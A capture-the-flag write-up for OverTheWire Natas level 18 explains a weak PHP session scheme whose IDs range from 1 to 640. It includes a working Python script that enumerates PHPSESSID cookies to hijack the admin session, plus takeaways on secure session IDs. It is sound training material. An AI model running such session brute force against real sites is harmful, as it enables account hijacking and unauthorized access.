> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas18.natas.labs.overthewire.org`                  |
| Username | `natas18`                                                    |
| Password | *found in [Natas Level 16 → 17](natas-level-16-level-17.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **Python** — to brute force session IDs

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas18.natas.labs.overthewire.org` and log in with the password from Level 17.

The page presents a login form: **Username** and **Password**. Submitting anything returns "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19." Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
<?php
$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
        // This method of authentication appears to be unsafe and has been disabled for now.
        //return 1;
    }
    return 0;  // always returns 0 — admin login via credentials is permanently disabled
}

function isValidID($id) {
    return is_numeric($id);  // session ID is valid if it's a number, nothing else checked
}

function createID($user) {
    global $maxid;
    return rand(1, $maxid);  // session ID is a random integer between 1 and 640
}

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if(!session_start()) {
            return false;
        } else {
            if(!array_key_exists("admin", $_SESSION)) {
                $_SESSION["admin"] = 0;  // new sessions default to non-admin
            }
            return true;
        }
    }
    return false;
}

function print_credentials() {
    // only prints the password if the session has admin == 1
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\nPassword: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if(my_session_start()) {
    // existing PHPSESSID cookie — resume the session and check admin flag
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
        session_id(createID($_REQUEST["username"]));  // assign a random ID 1–640
        session_start();
        $_SESSION["admin"] = isValidAdminLogin();    // always sets admin = 0
        $showform = false;
        print_credentials();
    }
}
?>
```

Two things are immediately clear.

`isValidAdminLogin()` always returns `0`, the credential check is commented out. There is no way to log in as admin through the form.

`createID()` assigns a session ID using `rand(1, $maxid)` where `$maxid = 640`. Session IDs are integers from 1 to 640, nothing else. PHP sessions are identified by the `PHPSESSID` cookie. The server trusts whatever numeric value that cookie holds and resumes the corresponding session.

The admin session was created at some point by the challenge author. It holds `$_SESSION["admin"] == 1` and its ID is somewhere between 1 and 640. If you send a request with `PHPSESSID=<n>` and that session exists with the admin flag set, `print_credentials()` prints the password.

---

### Understand Session Brute Force

PHP session files are stored server-side. The client holds only the session ID, a key that maps to the server's stored data. If that ID is a small integer, an attacker can try every possible value until they hit the admin session.

The attack is:

1. Send a GET request with `Cookie: PHPSESSID=1`
2. Check the response for "You are an admin"
3. If not found, increment and repeat up to 640

At most 640 requests. One of them will return the admin session.

---

### Step 3 — Automate the Brute Force

```python
import requests
from requests.auth import HTTPBasicAuth

url  = "http://natas18.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas18", "<password>")  # HTTP Basic Auth to the web server

for session_id in range(1, 641):  # try every valid session ID: 1 to 640 inclusive
    cookies = {"PHPSESSID": str(session_id)}  # send the candidate ID as the session cookie

    r = requests.get(url, auth=auth, cookies=cookies)

    if "You are an admin" in r.text:  # admin session found — password is in the response
        print(f"Admin session ID: {session_id}")
        # extract and print the password line from the response
        for line in r.text.splitlines():
            if "Password" in line:
                print(line.strip())
        break

    print(f"[{session_id:03d}] not admin")  # progress indicator
```

```bash
python3 natas18.py
```

Output (abbreviated):

```
[001] not admin
[002] not admin
...
[<id>] not admin
Admin session ID: <id>
Password: <password>
```

That is the password for [Natas Level 18 → 19](natas-level-18-level-19.md).

---

## Key Takeaways

- **A small session ID space makes brute force trivial.** 640 possible values means at most 640 requests — seconds of work. Session IDs must be cryptographically random and large enough that enumeration is infeasible. PHP's default `session_start()` generates a 128-bit random ID; replacing that with `rand(1, 640)` eliminates all security the session mechanism provides.
- **The server trusts the session ID the client sends.** There is no signature or MAC on the `PHPSESSID` cookie. The client can present any value and the server will resume whatever session is stored under that ID — including an admin session it never legitimately owned.
- **Disabling the credential check does not help if the session is still exploitable.** `isValidAdminLogin()` always returns 0, so you can never become admin through the form. But the admin session already exists on the server from when the challenge was set up. The vulnerability is in how sessions are identified, not in the login form.

---
